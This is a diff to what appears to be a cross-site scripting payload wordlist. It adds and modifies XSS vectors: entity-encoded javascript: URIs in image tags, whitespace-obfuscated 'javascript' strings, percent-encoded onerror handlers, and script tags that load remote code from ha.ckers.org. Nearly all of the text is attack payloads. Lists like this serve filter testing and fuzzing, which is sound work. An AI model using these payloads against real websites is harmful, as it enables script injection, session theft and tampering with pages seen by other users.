@@ -19,12 +19,12 @@
 <IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 <IMG%20SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
-<IMG SRC="jav	ascript:alert('XSS');">
-<IMG SRC="jav	ascript:alert('XSS');">
-<IMG SRC="jav
-ascript:alert('XSS');">
+<IMG SRC="jav ascript:alert('XSS');">
+<IMG SRC="jav as cript:alert('XSS');">
+<IMG SRC="jav ascr ipt:alert('XSS');">
 bc49d<img src%3da onerror%3dalert(1)>6b2483ee7c809283
 4ebb7<img%20src%3da%20onerror%3dalert(1)>aa7589bd51d
+<img%20src%3da%20onerror%3dalert(1)>
 4142e"><img%20src%3da%20onerror%3dalert(1)>c8c7917888b8dd772
 23f35"><img%20src%3da%20onerror%3dalert(1)>95b6f8c95a1bbf2c0
 afa81"><img%20src%3da%20onerror%3dalert(1)>7a1fc0514a72f8ad
@@ -48,6 +48,8 @@ perl%20-e%20'print%20"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>";' > out
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
 <SCRIPT SRC=//ha.ckers.org/.j>
+<SCRIPT SRC=//ha.ckers.org/.js>
+<SCRIPT SRC=//ha.ckers.org/xss.js>
 <IMG SRC="javascript:alert('XSS')"
 <iframe src=http://ha.ckers.org/scriptlet.html <
 <SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>
